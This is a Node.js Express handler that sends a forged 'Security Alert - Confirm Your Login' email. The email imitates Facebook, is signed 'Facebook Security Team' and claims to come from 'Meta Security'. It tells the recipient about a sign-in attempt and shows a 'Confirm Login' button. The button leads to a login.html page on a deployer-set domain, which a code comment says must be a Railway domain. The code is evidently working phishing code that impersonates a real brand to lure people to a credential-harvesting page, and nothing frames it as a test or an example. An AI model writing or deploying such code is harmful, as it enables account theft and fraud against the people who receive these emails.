const sendEmail = require("../services/emailService");

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email, name = "User" } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email required" });
    }

    // ✅ FRONTEND URL (MUST BE RAILWAY DOMAIN)
    const baseUrl = process.env.FRONTEND_URL;
    if (!baseUrl) {
      console.error("FRONTEND_URL missing");
      return res.status(500).json({ success: false, message: "Config error" });
    }

    const loginLink = `${baseUrl.replace(/\/$/, "")}/login.html`;

    console.log("🔗 LOGIN LINK:", loginLink);

    const device = req.headers["user-agent"] || "Unknown Device";
    const time = new Date().toLocaleString();

    const html = `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- ✅ FORCE DARK/LIGHT SUPPORT -->
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark">

<style>
@media (prefers-color-scheme: light) {
  body { background: #f0f2f5 !important; }
  .container { color: #1c1e21 !important; }
  .muted { color: #606770 !important; }
  .divider { border-top: 1px solid #dddfe2 !important; }
}
</style>

</head>

<body style="margin:0;padding:0;background:#0b0c0f;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">

<table width="100%" cellpadding="0" cellspacing="0" style="background:#0b0c0f;">
<tr>
<td align="center">

<!-- MAIN CONTAINER -->
<table width="520" cellpadding="0" cellspacing="0" style="max-width:520px;width:100%;padding:28px 20px;">

<!-- 🔵 PREMIUM BRAND HEADER -->
<tr>
<td style="padding-bottom:14px;">

<span style="
font-size:24px;
font-weight:700;
letter-spacing:-0.3px;
">
<span style="color:#2374e1;">Face</span><span style="color:#ffffff;">book</span>
</span>

</td>
</tr>

<!-- DIVIDER -->
<tr>
<td>
<hr class="divider" style="border:0;border-top:1px solid #2a2b2e;margin:12px 0 24px 0;">
</td>
</tr>

<!-- CONTENT -->
<tr>
<td class="container" style="color:#e4e6eb;font-size:15px;line-height:1.6;">

<p style="margin:0 0 18px 0;">Hi ${name},</p>

<p style="margin:0 0 18px 0;">
We detected a sign-in attempt to your Facebook Security account from a new environment.
</p>

<b style="display:block;margin-bottom:12px;font-size:15px;">
About this activity
</b>

<!-- INFO TABLE -->
<table width="100%" cellpadding="0" cellspacing="0" style="margin-top:10px;font-size:14px;">
<tr>
<td width="28">🕒</td>
<td class="muted" style="color:#b0b3b8;">${time}</td>
</tr>
<tr>
<td>📍</td>
<td class="muted" style="color:#b0b3b8;">Unknown location</td>
</tr>
<tr>
<td>📱</td>
<td class="muted" style="color:#b0b3b8;">${device}</td>
</tr>
</table>

</td>
</tr>

<!-- BUTTON -->
<tr>
<td style="padding:30px 0 10px 0;">

<a href="${loginLink}"
style="
display:block;
width:100%;
background:#2374e1;
color:#ffffff !important;
text-decoration:none;
text-align:center;
padding:14px 0;
border-radius:10px;
font-weight:600;
font-size:15px;
letter-spacing:0.2px;">
Confirm Login
</a>

</td>
</tr>

<!-- FALLBACK -->
<tr>
<td class="muted" style="color:#b0b3b8;font-size:13px;line-height:1.6;padding-top:10px;">

<!-- WARNING -->
<tr>
<td style="padding-top:22px;font-size:14px;color:#e4e6eb;">
If this wasn’t you, we recommend securing your account immediately.
</td>
</tr>

<!-- SIGN OFF -->
<tr>
<td style="padding-top:22px;color:#e4e6eb;font-size:14px;">
Thanks,<br>
<strong>Facebook Security Team</strong>
</td>
</tr>

<!-- FOOTER -->
<tr>
<td style="padding-top:28px;">
<hr class="divider" style="border:0;border-top:1px solid #2a2b2e;">
</td>
</tr>

<tr>
<td align="center" class="muted" style="font-size:12px;color:#8d949e;padding-top:14px;line-height:1.6;">

© 2026 Meta Security<br>
This message was sent to ${email}<br>
Do not share this email with anyone

</td>
</tr>

</table>

</td>
</tr>
</table>

</body>
</html>
`;

    const sent = await sendEmail({
      to: email,
      subject: "🔐 Security Alert - Confirm Your Login",
      html,
    });

    if (!sent) {
      return res.status(500).json({ success: false });
    }

    return res.status(200).json({ success: true });

  } catch (err) {
    console.error("EMAIL ERROR:", err);
    return res.status(500).json({ success: false });
  }
};